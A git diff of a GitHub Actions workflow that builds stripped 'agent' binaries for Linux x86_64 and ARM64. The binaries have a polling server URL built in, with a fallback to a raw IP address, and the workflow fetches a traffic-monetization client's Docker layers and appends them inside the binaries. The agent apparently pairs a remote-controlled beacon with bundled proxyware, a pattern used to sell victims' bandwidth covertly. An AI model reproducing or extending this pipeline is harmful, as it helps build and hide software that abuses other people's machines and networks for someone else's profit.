@@ -14,56 +14,67 @@ permissions:
 jobs:
   build-linux:
     runs-on: ubuntu-latest
-    container: debian:bullseye-slim
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Install Compilers & Dependencies
-        run: |
-          apt-get update -qq
-          apt-get install -y --no-install-recommends g++ g++-aarch64-linux-gnu ca-certificates python3 curl
-
-      - name: Compile Linux Binaries
+      - name: Compile Linux Binaries inside Debian 11 Bullseye Container
         run: |
           mkdir -p bin
           SERVER="${{ secrets.CONF_SERVER_URL }}"
           [ -z "$SERVER" ] && SERVER="http://65.20.91.208/turbox_server.php"
 
-          # Build Linux x86_64
+          cat << 'SH_EOF' > /tmp/build_linux.sh
+          #!/bin/bash
+          set -e
+          apt-get update -qq
+          apt-get install -y --no-install-recommends g++ g++-aarch64-linux-gnu ca-certificates python3 curl
+          
+          mkdir -p bin
+
+          # Build Linux x86_64 (Debian 11 Bullseye GLIBC 2.31 baseline)
           g++ -O3 -std=c++17 agent.cpp \
-            -DCONF_SERVER_URL="\"$SERVER\"" \
+            -DCONF_SERVER_URL="\"$CONF_SERVER\"" \
             -DCONF_INTERVAL=15 \
             -static-libstdc++ -static-libgcc \
             -lpthread -s \
             -o bin/agent_linux_x86_64
 
-          # Build Linux ARM64
+          # Build Linux ARM64 (Debian 11 Bullseye GLIBC 2.31 baseline)
           aarch64-linux-gnu-g++ -O3 -std=c++17 agent.cpp \
-            -DCONF_SERVER_URL="\"$SERVER\"" \
+            -DCONF_SERVER_URL="\"$CONF_SERVER\"" \
             -DCONF_INTERVAL=15 \
             -static-libstdc++ -static-libgcc \
             -lpthread -s \
             -o bin/agent_linux_arm64
 
-          # Tải và MERGE trực tiếp native Linux engine vào 2 file binary Linux (siêu tốc, không re-compress)
           echo "Merging native Linux self-contained engine directly into binary files..."
-          python3 - << 'EOF'
+          python3 - << 'PY_EOF'
           import urllib.request, json, struct, os
 
           def bundle_layer(digest, out_bin):
               print(f"Downloading layer {digest[:16]} for {out_bin}...")
-              tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull', timeout=20).read().decode())['token']
-              req = urllib.request.Request(f'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/{digest}', headers={'Authorization': f'Bearer {tok}'})
+              tok = json.loads(urllib.request.urlopen("https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull", timeout=20).read().decode())["token"]
+              req = urllib.request.Request(f"https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/{digest}", headers={"Authorization": f"Bearer {tok}"})
               data = urllib.request.urlopen(req, timeout=60).read()
-              foot = struct.pack('<Q', len(data)) + b'TURBOX_BUNDLE\x00\x00\x00'
+              foot = struct.pack("<Q", len(data)) + b"TURBOX_BUNDLE\x00\x00\x00"
               if os.path.exists(out_bin):
-                  open(out_bin, 'ab').write(data + foot)
+                  open(out_bin, "ab").write(data + foot)
                   print(f"Merged {len(data)} bytes directly into {out_bin}")
 
-          bundle_layer('sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'bin/agent_linux_x86_64')
-          bundle_layer('sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a', 'bin/agent_linux_arm64')
-          EOF
+          bundle_layer("sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b", "bin/agent_linux_x86_64")
+          bundle_layer("sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a", "bin/agent_linux_arm64")
+          PY_EOF
+          SH_EOF
+          chmod +x /tmp/build_linux.sh
+
+          docker run --rm \
+            -e CONF_SERVER="$SERVER" \
+            -v "$GITHUB_WORKSPACE":/workspace \
+            -v /tmp/build_linux.sh:/build_linux.sh \
+            -w /workspace \
+            debian:bullseye-slim \
+            /build_linux.sh
 
       - name: Upload Linux Binaries
         uses: actions/upload-artifact@v4
